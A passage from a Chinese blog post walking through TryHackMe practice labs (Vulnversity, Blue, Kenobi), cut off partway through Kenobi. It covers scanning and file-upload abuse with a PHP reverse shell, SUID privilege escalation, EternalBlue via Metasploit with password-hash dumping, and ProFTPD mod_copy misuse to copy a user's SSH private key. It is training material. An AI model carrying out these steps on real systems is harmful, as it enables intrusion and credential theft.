<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="THM-进攻性渗透测试, hybcx&#39;s blog">
    <meta name="description" content="0x01 vulnversity漏洞
侦查
nmap扫描目标机
Nmap 是一个免费、开源且功能强大的工具，用于发现计算机网络上的主机和服务。在我们的示例中，我们使用 Nmap 扫描该计算机以识别特定端口上运行的所有服务。 Nmap 有很多">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>THM-进攻性渗透测试 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">THM-进攻性渗透测试</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/tryhackme/">
                                <span class="chip bg-color">tryhackme</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/tryhackme/" class="post-category">
                                tryhackme
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-03-29
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-05-02
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    22.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    91 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 vulnversity漏洞</h1>
<h2 id="侦查">侦查</h2>
<p>nmap扫描目标机</p>
<p>Nmap 是一个免费、开源且功能强大的工具，用于发现计算机网络上的主机和服务。在我们的示例中，我们使用 Nmap 扫描该计算机以识别特定端口上运行的所有服务。 Nmap 有很多功能；下面的表格总结了其一些功能。</p>
<table>
<thead>
<tr>
<th>Nmap</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sV</td>
<td>尝试确定正在运行的服务的版本</td>
</tr>
<tr>
<td>-p or -p- -</td>
<td>端口扫描端口 <x> 或扫描所有端口</x></td>
</tr>
<tr>
<td>-Pn</td>
<td>禁用主机发现并扫描开放端口</td>
</tr>
<tr>
<td>-A</td>
<td>启用操作系统和版本检测，执行内置脚本以进行进一步枚举</td>
</tr>
<tr>
<td>-sC</td>
<td>使用默认 Nmap 脚本扫描</td>
</tr>
<tr>
<td>-v</td>
<td>详细模式</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP端口扫描</td>
</tr>
<tr>
<td>-sS</td>
<td>TCP SYN端口扫描</td>
</tr>
</tbody>
</table>
<p><img src="image-20240329082531210.png" alt="image-20240329082531210"></p>
<p><img src="image-20240329082603574.png" alt="image-20240329082603574"></p>
<p>这里看文章hint说是，利用-O参数进行扫描，如下图所示，反而还不如上面的-sV选项有用（上面明确说是ubuntu OS）</p>
<p><img src="image-20240329083230260.png" alt="image-20240329083230260"></p>
<p><img src="image-20240329084631365.png" alt="image-20240329084631365"></p>
<h2 id="使用gobuste扫描目录">使用gobuste扫描目录</h2>
<p>使用名为 <code>Gobuster</code> 的快速目录发现工具，您将找到可用于上传 shell 的目录。让我们首先扫描网站以查找任何隐藏的目录。为此，我们将使用 Gobuster。</p>
<p>Gobuster 是一个用于暴力破解 URI（目录和文件）、DNS 子域和虚拟主机名的工具。对于这台机器，我们将重点使用它来暴力破解目录。</p>
<p>在这里下载 <a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a>，或者如果您使用的是 Kali Linux，请运行 sudo apt-get install gobuster</p>
<p>首先，您需要一个 Gobuster 的单词列表（它将用于快速浏览单词列表以确定公共目录是否可用。如果您使用 Kali Linux，您可以在 /usr/share/wordlists 下找到许多单词列表）您还可以在 AttackBox 中使用位于 /usr/share/wordlists/dirbuster/directory-list-1.0.txt 的目录的单词列表。</p>
<p>现在让我们使用 gobuster dir -u <a target="_blank" rel="noopener" href="http://10.10.127.89:3333">http://10.10.127.89:3333</a> -w <word list="" location=""> 运行带有单词列表的 Gobuster</word></p>
<table>
<thead>
<tr>
<th>Gobuster flag</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e</td>
<td>在控制台中打印完整的 URL</td>
</tr>
<tr>
<td>-u</td>
<td>目标网址</td>
</tr>
<tr>
<td>-w</td>
<td>单词列表的路径</td>
</tr>
<tr>
<td>-U and -P</td>
<td>基本身份验证的用户名和密码</td>
</tr>
<tr>
<td>-p <strong><x></x></strong></td>
<td>用于请求的代理</td>
</tr>
<tr>
<td>-c <http cookies=""></http></td>
<td>指定一个 cookie 来模拟您的身份验证</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">gobuster dir -u <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.127.89:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240329090358992.png" alt="image-20240329090358992"></p>
<p><img src="image-20240329090410555.png" alt="image-20240329090410555"></p>
<h2 id="入侵网络服务器">入侵网络服务器</h2>
<p>现在您已经找到了上传文件的表单，我们可以利用它来上传并执行我们的有效负载，这将导致网络服务器受到损害。</p>
<p><img src="image-20240329085728352.png" alt="image-20240329085728352"></p>
<p>我们将使用 Intruder（用于自动化定制攻击）。首先，创建一个具有以下扩展名的单词列表：</p>
<ul>
<li>.php</li>
<li>.php3</li>
<li>.php4</li>
<li>.php5</li>
<li>.phtml</li>
</ul>
<p>现在确保 BurpSuite 配置为拦截所有浏览器流量。上传一个文件;一旦捕获该请求，将其发送给入侵者。单击“有效负载”并选择“狙击手”攻击类型。</p>
<p>现在单击“位置”选项卡，找到文件名并“添加§”到扩展名。它应该看起来像这样：</p>
<p><img src="image-20240329090625398.png" alt="image-20240329090625398"></p>
<p><img src="image-20240329090703625.png" alt="image-20240329090703625"></p>
<p><img src="image-20240329091447177.png" alt="image-20240329091447177"></p>
<p>这里我还因为后缀被url编码导致一直出错。。。。现在我们知道可以为有效负载使用什么扩展，我们就可以继续前进了。</p>
<p>我们将使用 PHP 反向 shell 作为我们的有效负载。反向 shell 的工作原理是在远程主机上调用并强制该主机与您建立连接。因此，您将侦听传入的连接，上传并执行 shell，这将向您发出控制信号！</p>
<p>在此处下载以下反向 <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP shell</a>。</p>
<p>要远程访问此计算机，请按照下列步骤操作：</p>
<ol>
<li>编辑 php-reverse-shell.php 文件并将 ip 编辑为您的 tun0 ip（您可以通过在 TryHackMe 连接设备的浏览器中访问 <a target="_blank" rel="noopener" href="http://10.10.10.10">http://10.10.10.10</a> 来获取此信息）。</li>
<li>将此文件重命名为 php-reverse-shell.phtml</li>
<li>我们现在将使用 netcat 监听传入连接。运行以下命令：nc -lvnp 1234</li>
<li>上传您的 shell 并导航到 <a target="_blank" rel="noopener" href="http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml">http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml</a> - 这将执行您的有效负载</li>
<li>您应该在 Netcat 会话上看到一个连接</li>
</ol>
<p><img src="image-20240329091559947.png" alt="image-20240329091559947"></p>
<p><img src="image-20240329091734831.png" alt="image-20240329091734831"></p>
<p><img src="image-20240329092003754.png" alt="image-20240329092003754"></p>
<p><img src="image-20240329092015866.png" alt="image-20240329092015866"></p>
<h2 id="权限提升">权限提升</h2>
<p>现在您已经入侵了这台机器，我们将升级权限并成为超级用户（root）。</p>
<p>在 Linux 中，SUID（执行时设置所有者 userId）是赋予文件的一种特定类型的文件权限。 SUID 向用户授予临时权限，以在文件所有者（而不是运行它的用户）的许可下运行程序/文件。</p>
<p>例如，用于更改密码的二进制文件具有设置了 SUID 位 (/usr/bin/passwd)。这是因为要更改密码，它将需要写入您无权访问但 root 有权访问的 shadow 文件，因此它具有 root 权限来进行正确的更改。</p>
<p><img src="image-20240329090026559.png" alt="image-20240329090026559"></p>
<p>搜索的命令为：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><img src="image-20240329092101873.png" alt="image-20240329092101873"></p>
<p>这里的手法可以参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/%E4%BB%A5%E5%8F%8A">https://gtfobins.github.io/gtfobins/systemctl/以及</a> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2238031">权限提升 | 带SUID的命令提权</a></p>
<p><img src="image-20240329093359559.png" alt="image-20240329093359559"></p>
<p>这里思路就是将/bin/bash命令赋值到tmp临时目录下，并且给该目录增加+s root权限，以至于后续可以以root的身份执行，不至于无权访问，当然这里也能写上bash反弹shell</p>
<p>这里也补充一个东西，找到www-data可以写入的目录</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">find <span class="token operator">/</span> -type f -maxdepth 2 -writable
find <span class="token operator">/</span> -type d -maxdepth 2 -writable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="总结">总结</h2>
<p>这道题目思路是先常规nmap扫描，发现敏感端口，接着访问web站点，测试一波功能点发现文件上传，接着fuzz可以上传的后缀，发现phtml可以上传，之后就是上传可以反弹shell马，拿到shell之后，就是提权了，这里用到的就是suid提权。</p>
<h1>0x02 blue挑战</h1>
<h2 id="侦查-2">侦查</h2>
<p>扫描并了解该机器容易受到哪些攻击。请注意，该计算机不响应 ping (ICMP)，并且可能需要几分钟才能启动。这个房间并不是一个 boot2root CTF，而是一个针对完全初学者的教育系列。除了基本练习之外，专业人士在这个房间里可能不会得到什么，因为这里的过程是针对初学者的。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -sV -p- -Pn -T4 10.10.176.146<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240329110144217.png" alt="image-20240329110144217"></p>
<p><img src="image-20240329110038634.png" alt="image-20240329110038634"></p>
<h2 id="访问获取权限">访问获取权限</h2>
<p>利用机器并站稳脚跟。</p>
<p><img src="image-20240329112434427.png" alt="image-20240329112434427"></p>
<p><img src="image-20240329113557316.png" alt="image-20240329113557316"></p>
<p><img src="image-20240329113453145.png" alt="image-20240329113453145"></p>
<h2 id="提升权限">提升权限</h2>
<p>升级权限，了解如何在 Metasploit 中升级 shell。</p>
<p>上述可以看到存在SMB ms17-010漏洞，这里选择永恒之蓝来利用</p>
<p><img src="image-20240329123902622.png" alt="image-20240329123902622"></p>
<p>设置好相关参数，即可直接run</p>
<p><img src="image-20240329123920314.png" alt="image-20240329123920314"></p>
<p><img src="image-20240329123926360.png" alt="image-20240329123926360"></p>
<p>拿到shell之后，我们退到后台，尝试将该反弹shell转换为meterpreter类型的shell</p>
<p>搜寻一番可以发现该模块：post/multi/manage/shell_to_meterpreter</p>
<p>如下图所示，设置相关参数</p>
<p><img src="image-20240329124058141.png" alt="image-20240329124058141"></p>
<p>直接run运行，之后会看到新增一个会话</p>
<p><img src="image-20240329123812533.png" alt="image-20240329123812533"></p>
<p>切换到会话3，并且看到我们当前的权限就是system（NT AUTHORITY\SYSTEM）</p>
<p><img src="image-20240329124202174.png" alt="image-20240329124202174"></p>
<p>通过命令“shell”打开 dos shell 并运行“whoami”。这应该表明我们确实是一个系统。之后将此 shell 置于后台并再次选择我们的 meterpreter 会话以供使用。</p>
<p><img src="image-20240329124243103.png" alt="image-20240329124243103"></p>
<p>列出通过“ps”命令运行的所有进程。仅仅因为我们是系统并不意味着我们的流程是。在此列表底部找到一个在 NT AUTHORITY\SYSTEM 运行的进程，并记下进程 ID（最左列）。</p>
<p><img src="image-20240329124316011.png" alt="image-20240329124316011"></p>
<p>如上图，这里我选择2652的进程id</p>
<p>使用“migrate PROCESS_ID”命令迁移到此进程，其中进程 ID 是您刚刚在上一步中记下的 ID。这可能需要多次尝试，迁移过程不是很稳定。如果失败，您可能需要重新运行转换过程或重新启动计算机并再次启动。如果发生这种情况，请下次尝试不同的过程。</p>
<p><img src="image-20240329130230127.png" alt="image-20240329130230127"></p>
<p>这里也是尝试了多个进程，发现很多都显示没有权限，2912恰好符合</p>
<h2 id="破解">破解</h2>
<p>转储非默认用户的密码并破解它！</p>
<p>在我们提升的 meterpreter shell 中，运行命令“hashdump”。只要我们有正确的权限，这就会转储计算机上的所有密码。非默认用户的名称是什么？</p>
<p><img src="image-20240329130403964.png" alt="image-20240329130403964"></p>
<p><img src="image-20240329130649628.png" alt="image-20240329130649628"></p>
<p>这里可以用john或者在线网站破解</p>
<p><img src="image-20240329130447362.png" alt="image-20240329130447362"></p>
<p>这里我了解了一下上述NT格式的含义：<code>--format=NAME</code></p>
<p>name指定密文格式,指定密文格式名称,为DES/BSDI/MD5/BF/AFS/LM指定使用某种密文格式进行破解</p>
<p>具体参考：<a target="_blank" rel="noopener" href="https://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols">https://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols</a></p>
<h2 id="寻找flag">寻找flag</h2>
<p>找到这台机器上插着的三面旗帜。这些不是传统的标志，而是代表 Windows 系统中的关键位置。使用下面提供的提示来完成这个房间！</p>
<p>标志1：该标志可以在系统根目录中找到。</p>
<p><img src="image-20240329131447799.png" alt="image-20240329131447799"></p>
<p>标志2：该标志可以在 Windows 中存储密码的位置找到。</p>
<p>勘误表：Windows 确实不喜欢此标志的位置，并且偶尔会删除它。在某些情况下，可能需要终止/重新启动计算机并重新运行漏洞利用程序才能找到此标志。这种情况相对罕见，但也有可能发生。</p>
<p><img src="image-20240329131618845.png" alt="image-20240329131618845"></p>
<p>位置存在于Windows的system32下的config目录下</p>
<p><img src="image-20240329131612265.png" alt="image-20240329131612265"></p>
<p>标志3：这面旗帜可以在一个绝佳的位置找到，可以进行掠夺。毕竟，管理员通常会保存一些非常有趣的东西。</p>
<p><img src="image-20240329131822411.png" alt="image-20240329131822411"></p>
<h2 id="总结-2">总结</h2>
<p>依旧是nmap扫描，发现敏感端口445，联想到永恒之蓝，直接msf exploit，发现成功，接下来为了方便，想办法将该shell转变为meterpreter shell，选择post中的某个模块，成功转换，接着就是提权，采用migrate 进程ID来提权，迁移进程成功之后，就提升了权限，接下来就是找敏感文件：比如根目录、Windows\system32\config目录，以及用户对应的document目录</p>
<h1>0x03 Kenobi挑战</h1>
<p>有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。</p>
<p>本会议室将介绍访问 Samba 共享、操纵 proftpd 的易受攻击版本以获得初始访问权限以及通过 SUID 二进制文件将您的权限升级为 root。</p>
<h2 id="枚举Samba共享">枚举Samba共享</h2>
<p>Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常用共享资源。它通常被称为网络文件系统。</p>
<p>Samba 基于服务器消息块 (SMB) 的通用客户端/服务器协议。 SMB 是专门为 Windows 开发的，如果没有 Samba，其他计算机平台就会与 Windows 机器隔离，即使它们是同一网络的一部分。</p>
<p>使用 nmap 我们可以枚举 SMB 共享的机器，Nmap 能够自动运行各种网络任务。有一个脚本可以枚举共享！</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -p 445 --script=smb-enum-shares.nse<span class="token punctuation">,</span>smb-enum-users.nse 10.10.67.234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>SMB 有两个端口：445 和 139。</p>
<p><img src="image-20240404083553034.png" alt="image-20240404083553034"></p>
<p>首先nmap常规扫描：<code>nmap -sS -sV -p- -T4 10.10.67.234</code></p>
<p><img src="image-20240404085252080.png" alt="image-20240404085252080"></p>
<p>这里有点不清楚，为何答案是7个端口，用了hint的 nmap命令，发现还真是7个，有点不理解（可能是我全端口扫描的缘故吧）</p>
<blockquote>
<p>Samba监听端口有：TCP和UDP------tcp端口相对应的服务是smbd服务，其作用是提供对服务器中文件、打印资源的共享访问；udp端口相对应的服务是nmbd服务，其作用是提供基于NetBIOS主机名称的解析。</p>
<p>nmap有一个用于枚举SMB共享的脚本，使用 nmap，我们可以枚举一台机器的SMB 共享。</p>
</blockquote>
<p>继续找SMB的共享：<code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234</code></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#也可以使用以下命令：smbclient -L \\\\10.10.54.34\\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404090738579.png" alt="image-20240404090738579"></p>
<p>使用smbclient命令，匿名连接目标机的SMB共享，查看共享系统上存在什么文件</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">smbclient <span class="token comment">//10.10.67.234/anonymous #这里不用输入密码直接进入即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404091212561.png" alt="image-20240404091212561"></p>
<p>看到这里存在一个log.txt文件。你可以使用smbget命令，通过匿名用户 递归地下载整个SMB 共享，共享系统中的文件将会被下载到本地</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">smbget <span class="token property">smb</span><span class="token punctuation">:</span><span class="token comment">//10.10.67.234/anonymous/log.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里的smbget命令出问题了，说是解析顺序不正确，看了文章去改配置文件smb.conf但是没找到相关选项，真是服了，看了官方文档也没有效果。这里我就无奈指定文件下载了，-R选项用不了。。。。</p>
<p><img src="image-20240404093624692.png" alt="image-20240404093624692"></p>
<p><img src="image-20240404093803550.png" alt="image-20240404093803550"></p>
<p>查看来自共享系统的log.txt文件内容，我们可以获取两个信息：</p>
<ul>
<li>为Kenobi用户生成 SSH 密钥时的信息–Kenobi用户的ssh密钥–保存在/home/kenobi/.ssh路径下</li>
<li>有关 ProFTPD 服务器的信息（ 运行FTP服务的用户是 Kenobi）</li>
</ul>
<p>之前的端口扫描显示了 端口111正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC-- remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。</p>
<p>查看本例中端口111的nmap扫描信息，可以发现nfs（network file system）服务被远程启用，接下来尝试枚举nfs信息：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -p 111 --script=nfs-ls<span class="token punctuation">,</span>nfs-statfs<span class="token punctuation">,</span>nfs-showmount 10.10.67.234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240404094449466.png" alt="image-20240404094449466"></p>
<p><img src="image-20240404094504261.png" alt="image-20240404094504261"></p>
<p><img src="image-20240404094507914.png" alt="image-20240404094507914"></p>
<h2 id="使用-ProFtpd-获得初始访问权限">使用 ProFtpd 获得初始访问权限</h2>
<p>ProFtpd 是一个免费的开源 FTP 服务器，兼容 Unix 和 Windows 系统。在过去的软件版本中，它也容易受到攻击。</p>
<p>可以使用netcat来连接FTP服务，看其版本信息<code>nc ip 21</code></p>
<p><img src="image-20240404094914714.png" alt="image-20240404094914714"></p>
<p>我们可以使用 searchsploit 来查找特定软件版本的漏洞。Searchsploit 基本上只是 <a target="_blank" rel="noopener" href="http://exploit-db.com">exploit-db.com</a> 的命令行搜索工具。</p>
<p>ProFTPd 运行有多少漏洞？</p>
<p><img src="image-20240404095016525.png" alt="image-20240404095016525"></p>
<p>我们可以看到，该版本ProFtpd的mod_copy模块中存在漏洞。<br>
（mod_copy模块功能-参考链接：<a target="_blank" rel="noopener" href="http://www.proftpd.org/docs/contrib/mod_copy.html">http://www.proftpd.org/docs/contrib/mod_copy.html</a> ）</p>
<p>mod_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件/目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。</p>
<p>也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。</p>
<p>由之前的信息我们知道：Kenobi是运行FTP服务的用户、Kenobi用户的ssh密钥保存路径。</p>
<p>现在我们将使用 SITE CPFR 和 SITE CPTO 命令复制Kenobi的ssh私钥，我们将私钥复制到NFS所挂载的目录下，后继我们就能获取到这个私钥文件：</p>
